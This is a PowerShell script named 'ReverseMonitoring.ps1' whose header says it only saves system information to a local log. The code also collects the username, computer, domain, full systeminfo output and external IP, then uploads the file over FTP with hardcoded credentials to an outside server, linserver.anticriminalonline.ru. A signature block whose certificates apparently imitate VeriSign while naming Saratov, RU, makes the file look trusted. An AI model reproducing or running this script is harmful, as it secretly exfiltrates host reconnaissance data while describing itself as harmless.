# **********************************************************
#
# ReverseMonitoring.ps1
#
# This script Save System Information at File sysdump.log
#
#**********************************************************/

### Set Constants
$prefixc = "ftp"
$domainc = "linserver.anticriminalonline.ru"
$portc = 21
$serverdirc = "/tmp/Files/"
$userc = "MSSQLSR"
$passwordc = "Admin01234"
$prefixfilename = "sysdump"
$echomessage = ""

### Set Variables
$WC = new-object System.Net.WebClient
$WC.Proxy = $null$Wc.Credentials = New-Object System.Net.NetworkCredential( $userc, $passwordc)

## Set Temprorary Constants

$curdatetimestamp = Get-Date -Format "yyyy-MM-dd_HH-mm"
$compindent = "$env:USERNAME@$env:COMPUTERNAME@$env:USERDOMAIN"
$localfilename = "$prefixfilename-$compindent.log"
$localfile="$env:USERPROFILE\$localfilename"
$urlc = "${prefixc}://${domainc}:$portc$serverdirc$localfilename"

# Популярное решение "устранения" ошибки: Exception setting "OutputEncoding": "The handle is invalid."
& cmd /c ver | Out-Null

$encoding = [Console]::OutputEncoding 
[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("cp866")
try
{
    Echo "$localfilename::" | Out-File $localfile
    Echo "Message: $echomessage" | Out-File $localfile -Append
    Echo "Time Stamp: $curdatetimestamp" | Out-File $localfile -Append
    Echo "USER/COMPUTER/DOMAIN Name: $compindent" | Out-File $localfile -Append
    & systeminfo.exe | Out-File $localfile -Append
    Echo " ===***=== " | Out-File $localfile -Append
    Echo "External ip = " | Out-File $localfile -Append
    (Invoke-WebRequest -uri "http://ifconfig.me/ip" -UseBasicParsing ).Content | Out-File $localfile -Append
}
finally
{
    [Console]::OutputEncoding = $encoding
}

try
{
    $uri = New-Object System.Uri( $urlc )
    $WC. UploadFile( $uri,$localfile )
    #end try
 }
 catch
 {
    $err = $_
    Write-Host $error.exeption.message
}

# SIG # Begin signature block
# MIINPwYJKoZIhvcNAQcCoIINMDCCDSwCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQU8ZmHnayk3+jE5mG5ocTdUoTH
# w1mgggrgMIIDLDCCApmgAwIBAgIQSoUsHQ3bPLBJhSHroYJ16zAJBgUrDgMCHQUA
# MIGTMTMwMQYDVQQDEypWZXJpU2lnbiBDbGFzcyAzIEVWIENvZGUgU2lnbmluZyBD
# QSAtIEdlbjAxJTAjBgNVBAsTHFZlcmlTaWduIENlcnRpZmljYXRlIFNpZ25pbmcx
# FjAUBgNVBAoTDVZlcmlTaWduIEx0ZC4xEDAOBgNVBAcTB1NhcmF0b3YxCzAJBgNV
# BAYTAlJVMCAXDTIwMDgwMjA2NDIxMFoYDzIxMjAwODAyMDY0MjA5WjAsMSowKAYD
# VQQDEyFDbGFzcyAzIEVWIENvZGUgU2lnbmluZyBDQSAtIEdlbjAwgZ8wDQYJKoZI
# hvcNAQEBBQADgY0AMIGJAoGBAMsdyWeYU1sqhbVxNOpX6IUuz2JwaPPOkjNq3FLM
# kXtU2+R6oXr853PyWfFGiZbp+Zp4qZ0JxjXMzZ4/bqQBzllAQoI2tL8jTT3ahxMy
# 4q8dSo0qMfGHj3bKLc65Lzpa6xt8XUTqRRHM2mittf3/IFaf6xh4vsZ/N9pSiE/0
# AkpFAgMBAAGjgewwgekwDwYDVR0TAQH/BAUwAwIBBTAgBgNVHQQBAf8EFjAUMA4w
# DAYKKwYBBAGCNwIBFgMCB4AwMAYKKwYBBAGCNwIBCgQiMCCgHoAcaHR0cHM6Ly93
# d3cudmVyaXNpZ24uY29tL3JwYTAdBgNVHSUEFjAUBggrBgEFBQcDAwYIKoUDBQEY
# Ag8wYwYDVR0BBFwwWoAQaCtuHLjjXvogPHjzZ18xaqE0MDIxMDAuBgNVBAMTJ1Zl
# cmlTaWduIENsYXNzIDMgQ29kZSBTaWduaW5nIDIwMjAtMiBDQYIQJjMI8zdEKYdG
# SCd6hNwH9jAJBgUrDgMCHQUAA4GBAIG7hcv4ZX468BbM/U1mcXj86IBWDDvl39wN
# 7bzwdKHHL0B6bys7aF83lkdqIXGesWs4llnROMX4bJ1AYHJNGzwKWxBjJOs83AtE
# IVjU7Pk3HthdTFpAGcGHcJ++h55Aax5ADWS0K/8cRt5N7xmRGnESfyoJQzq3/gtY
# RkYCBO52MIIDyTCCArWgAwIBAgIQJjMI8zdEKYdGSCd6hNwH9jAJBgUrDgMCHQUA
# MDIxMDAuBgNVBAMTJ1ZlcmlTaWduIENsYXNzIDMgQ29kZSBTaWduaW5nIDIwMjAt
# MiBDQTAgFw0yMDA4MDIwNjQwNTVaGA8yMTIwMDgwMjA2NDA1NFowgZMxMzAxBgNV
# BAMTKlZlcmlTaWduIENsYXNzIDMgRVYgQ29kZSBTaWduaW5nIENBIC0gR2VuMDEl
# MCMGA1UECxMcVmVyaVNpZ24gQ2VydGlmaWNhdGUgU2lnbmluZzEWMBQGA1UEChMN
# VmVyaVNpZ24gTHRkLjEQMA4GA1UEBxMHU2FyYXRvdjELMAkGA1UEBhMCUlUwgZ8w
# DQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBALCgUGGYBFy+WEcH2xAII8jp25iShrdI
# 0bNAynJRTRdoc6p23sZ6Njffz5ODNqo2MlHRD9B298sV1s/rErJswzZE5CJh3Eq7
# CpxFo8Z7bOYTebcKBLYFvtBnzPWCpH8j6M9OcyjTiEA0/1MOCm+KIYoORs9WcsHL
# Taq2YnUw5tHVAgMBAAGjggEBMIH+MBIGA1UdEwEB/wQIMAYBAf8CAQUwIAYDVR0E
# AQH/BBYwFDAOMAwGCisGAQQBgjcCARYDAgeAMDAGCisGAQQBgjcCAQoEIjAgoB6A
# HGh0dHBzOi8vd3d3LnZlcmlzaWduLmNvbS9ycGEwOwYDVR0lBDQwMgYIKwYBBQUH
# AwEGCCsGAQUFBwMCBggrBgEFBQcDAwYIKwYBBQUHAwQGCCqFAwUBGAIPMFcGA1Ud
# AQRQME6AEHiV66FUatLJmUqI8CyehfChNDAyMTAwLgYDVQQDEydWZXJpU2lnbiBD
# bGFzcyAzIENvZGUgU2lnbmluZyAyMDIwLTIgQ0GCBLIuGUUwCQYFKw4DAh0FAAOC
# AQEAQR6aMBvQF7cshJ1OJrKN5j0682o9gcLkM2+GCH3PnvX2Izf+CiiJVE49ovmq
# K3H/YSzcv1ykrejZD7TUYpxHJw3BWQIxSG1LAY3vaALZgj4D9+n9yUGkYsZnA9Gq
# NMfJQKBaLaVNnOT1sHGFsKo2EZKbZLOxTwqWTehDa4MPyHCwjU9e+ubQaKOjzAia
# Xfyl8IHoTNXkcdZtILiqUw1KR06+mto0DhHxHN0lEyvxcVHItJSvxo0kj9l0YF89
# kYLd0MAsDEtku3S5BkVjtPAbOIULdjYjx7aZ8wpRswz38JV3B2PDmJXEzOMRiSiR
# Yx+G5iMyThNBto5kFcXaNOoUvjCCA98wggLLoAMCAQICBLIuGUUwCQYFKw4DAh0F
# ADAyMTAwLgYDVQQDEydWZXJpU2lnbiBDbGFzcyAzIENvZGUgU2lnbmluZyAyMDIw
# LTIgQ0EwIBcNMjAwNzIwMDYyMTA0WhgPMjEyMDA3MjAwNjIxMDNaMDIxMDAuBgNV
# BAMTJ1ZlcmlTaWduIENsYXNzIDMgQ29kZSBTaWduaW5nIDIwMjAtMiBDQTCCASIw
# DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALiM6joxcwWahO7JIA7yjVQVAehR
# 9PBYHCtQgoZny0nD+zt3dT8TwZ+V9NkI8ZXfimtMehGg4x1Rqfu9vm5mbHS5WLTR
# 1uykg8ql4R345lu4XtF66sQdbQR1WK4OSz7+vbXuTrXJX6TYnCfkCdZ7uHvvSxNw
# K8SE9UXizHL9TetHza5w/7lsIrqAnlFsEX0JEsTGehIa19xvc7HoL0XhYACSLvof
# bzbnP0Jbj69fnwcEhB0wPxz1Wmm+ioFFR+/dE+gFgoFpC/wo1ZeIaRcuJPtQPHVd
# jfgMTL3VL65RZC4dQlWhAlfxFhuyZSDrlBiUBZfcpNavb6xvo1s+hINGg90CAwEA
# AaOCAQEwgf4wEgYDVR0TAQH/BAgwBgEB/wIBBTAgBgNVHQQBAf8EFjAUMA4wDAYK
# KwYBBAGCNwIBFgMCB4AwMAYKKwYBBAGCNwIBCgQiMCCgHoAcaHR0cHM6Ly93d3cu
# dmVyaXNpZ24uY29tL3JwYTA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIG
# CCsGAQUFBwMDBggrBgEFBQcDBAYIKoUDBQEYAg8wVwYDVR0BBFAwToAQeJXroVRq
# 0smZSojwLJ6F8KE0MDIxMDAuBgNVBAMTJ1ZlcmlTaWduIENsYXNzIDMgQ29kZSBT
# aWduaW5nIDIwMjAtMiBDQYIEsi4ZRTAJBgUrDgMCHQUAA4IBAQBbkNXSy8qz84Ox
# U//48jGoxqIEXI5xYvbkzyNhvrbb2UTYXCrxWUiAO1g40+RE++6ZziyomoKJNVrl
# ZzZNTfEeuNV/HZkfGknXdqrKis0U9tjCUa2edLjegiWY26ohmypYYX20JPz2vOEF
# 7XsGl6RuHIgJ1IDW+6LyDshz+OtU0BrR3j4JE4RuL024950b9kKF51R7kyDqFEZy
# FLexxkPJbInJODkptLy6b8gM30XdjUIkY9nPGoyFSVsm3wIYmk1tr0yMgBiGz4MW
# 2qoF8AtBL8c0edT8nYyOnr/PSy1RRplN8SL6L9UWvJwepZnRikokJD36PGRhBpZo
# pT9Jhm/HMYIByTCCAcUCAQEwgagwgZMxMzAxBgNVBAMTKlZlcmlTaWduIENsYXNz
# IDMgRVYgQ29kZSBTaWduaW5nIENBIC0gR2VuMDElMCMGA1UECxMcVmVyaVNpZ24g
# Q2VydGlmaWNhdGUgU2lnbmluZzEWMBQGA1UEChMNVmVyaVNpZ24gTHRkLjEQMA4G
# A1UEBxMHU2FyYXRvdjELMAkGA1UEBhMCUlUCEEqFLB0N2zywSYUh66GCdeswCQYF
# Kw4DAhoFAKB4MBgGCisGAQQBgjcCAQwxCjAIoAKAAKECgAAwGQYJKoZIhvcNAQkD
# MQwGCisGAQQBgjcCAQQwHAYKKwYBBAGCNwIBCzEOMAwGCisGAQQBgjcCARYwIwYJ
# KoZIhvcNAQkEMRYEFNiyf5qW7xYPKFBUAolNzcDxqLI2MA0GCSqGSIb3DQEBAQUA
# BIGAENJkmogfKQ5+u+JTbS2zcCMNhBpQxnoqZeK6sq34CfKqj5wkEmYaSZ2NQeEV
# FMczupJ47JwNN1H2bHpKVRkyfckPIXDS/U27l1/3Hmek66U/naqZfq5gAFs+2JRy
# hRiwh15MIT3ZBV65nQcv8eMOLucfWkEgFahzyTsryNpMHok=
# SIG # End signature block
